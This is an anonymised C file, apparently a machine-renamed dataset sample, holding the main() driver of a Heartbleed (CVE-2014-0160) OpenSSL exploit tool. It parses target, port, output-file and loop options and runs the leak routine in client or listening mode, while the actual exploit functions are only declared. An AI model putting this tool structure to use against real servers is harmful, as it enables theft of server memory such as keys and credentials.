
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct option {char* member_0; int member_1; char member_3; int member_2; } ;
struct hostent {int dummy; } ;
typedef int connection ;


 int FUNC_0 (int,int ,int ) ;
 int FUNC_1 (char*) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int) ;
 scalar_t__ VAR_0 ;
 int FUNC_4 () ;
 struct hostent* FUNC_5 (char*) ;
 int FUNC_6 (int,char**,char*,struct option*,int*) ;
 int FUNC_7 (int *,int) ;
 char* FUNC_8 (int ) ;
 char* VAR_1 ;
 int FUNC_9 (int,int,int) ;
 int FUNC_10 (char*,...) ;
 int VAR_2 ;
 int FUNC_11 (int *,char*,int) ;
 int FUNC_12 (char*,char*,char*) ;
 int FUNC_13 () ;
 int FUNC_14 (char*) ;
 int FUNC_15 (char*,int) ;
 int FUNC_16 (char*,int) ;
 int * FUNC_17 (int) ;
 int * FUNC_18 (int) ;
 int FUNC_19 () ;

int FUNC_20(int VAR_3, char* VAR_4[]){
 int VAR_5, VAR_6, VAR_7, VAR_8;
 int VAR_9 = 1, VAR_10 = 0, VAR_11 = 0, VAR_12 = 0, VAR_13 = 9;
 int VAR_14 = 0;
 struct hostent *VAR_15;
 connection* VAR_16;
 char *VAR_17, *VAR_18;
 int VAR_19 = 0, VAR_20 = 0, VAR_21 = 0, VAR_22 = 0, VAR_23 = 0;
 FUNC_10("[ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit\n");
 FUNC_10("[ =============================================================\n");
        static struct option VAR_24[] = {
         {"server", 1, 0, 's'},
         {"port", 1, 0, 'p'},
  {"file", 1, 0, 'f'},
  {"type", 1, 0, 't'},
  {"bind", 1, 0, 'b'},
  {"verbose", 0, 0, 'v'},
  {"precmd", 1, 0, 'c'},
  {"loop", 0, 0, 'l'},
  {"help", 0, 0,'h'}
        };
 while(VAR_7 != -1) {
         VAR_7 = FUNC_6(VAR_3,VAR_4,"s:p:f:t:b:c:lvh",VAR_24,&VAR_8);
         switch(VAR_7) {
                 case -1:
                         break;
                 case 's':
    if(VAR_19==0){
     VAR_19 = 1;
     VAR_15 = FUNC_5(VAR_1);
     if(VAR_15==((void*)0)){
      FUNC_10("[!] FATAL: unknown host '%s'\n",VAR_1);
      FUNC_3(1);
     }
     VAR_17 = FUNC_8(FUNC_14(VAR_1) + 1);
     if(VAR_17==((void*)0)){
                    FUNC_10("[ error in malloc()\n");
                    FUNC_3(0);
            }
     FUNC_12(VAR_17,"%s",VAR_1);
                  }
    break;
                 case 'p':
    if(VAR_20==0){
     VAR_6 = FUNC_1(VAR_1);
     VAR_20 = 1;
    }
                         break;
   case 'f':
    if(VAR_21==0){
     VAR_18 = FUNC_8(FUNC_14(VAR_1) + 1);
     if(VAR_18==((void*)0)){
                    FUNC_10("[ error in malloc()\n");
                    FUNC_3(0);
            }
     FUNC_12(VAR_18,"%s",VAR_1);
     VAR_21 = 1;
    }
    break;
   case 't':
    if(VAR_22==0){
     VAR_9 = FUNC_1(VAR_1);
     VAR_22 = 1;
    }
    break;
   case 'h':
    FUNC_19();
    break;
   case 'b':
    if(VAR_19==0){
     VAR_19 = 1;
     VAR_17 = FUNC_8(FUNC_14(VAR_1)+1);
     if(VAR_17==((void*)0)){
                     FUNC_10("[ error in malloc()\n");
                    FUNC_3(0);
            }
     FUNC_12(VAR_17,"%s",VAR_1);
     VAR_12 = 1;
    }
    break;
   case 'c':
    if(VAR_23 == 0){
     VAR_23 = 1;
     VAR_13 = FUNC_1(VAR_1);
    }
    break;
   case 'v':
    VAR_11 = 1;
    break;
   case 'l':
    VAR_14 = 1;
    break;
   default:
    break;
  }
 }
 if(VAR_19==0||VAR_20==0||VAR_21==0||VAR_22==0||VAR_9 < 0){
  FUNC_10("[ try --help\n");
  FUNC_3(0);
 }
 FUNC_13();
 if(VAR_12==0){
  VAR_5 = FUNC_16(VAR_17, VAR_6);
  FUNC_9(VAR_5, VAR_13, VAR_11);
  VAR_16 = FUNC_18(VAR_5);
  FUNC_7(VAR_16,VAR_9);
  while(VAR_2==1){
   FUNC_11(VAR_16,VAR_18,VAR_11);
  }
  while(VAR_14==1){
   FUNC_10("[ entered heartbleed loop\n");
   VAR_0=0;
   VAR_2=1;
   FUNC_7(VAR_16,VAR_9);
   while(VAR_2==1){
    FUNC_11(VAR_16,VAR_18,VAR_11);
   }
  }
  FUNC_10("[ done.\n");
  FUNC_3(0);
 }
 else{
  int VAR_25, VAR_26, VAR_27;
  VAR_5 = FUNC_15(VAR_17, VAR_6);
  while(1){
         VAR_25=FUNC_0(VAR_5,0,0);
   if(VAR_25==-1){
    FUNC_10("[!] FATAL: problem with accept()\n");
    FUNC_3(0);
   }
   if((VAR_26=FUNC_4())){
    FUNC_2(VAR_25);
   }
         else{
    VAR_16 = FUNC_17(VAR_25);
    FUNC_9(VAR_5, VAR_13, VAR_11);
    FUNC_7(VAR_16,VAR_9);
    while(VAR_2==1){
     FUNC_11(VAR_16,VAR_18,VAR_11);
    }
    while(VAR_14==1){
     FUNC_10("[ entered heartbleed loop\n");
     VAR_0=0;
     VAR_2=0;
     FUNC_7(VAR_16,VAR_9);
     while(VAR_2==1){
      FUNC_11(VAR_16,VAR_18,VAR_11);
     }
    }
    FUNC_10("[ done.\n");
    FUNC_3(0);
   }
  }
 }
}
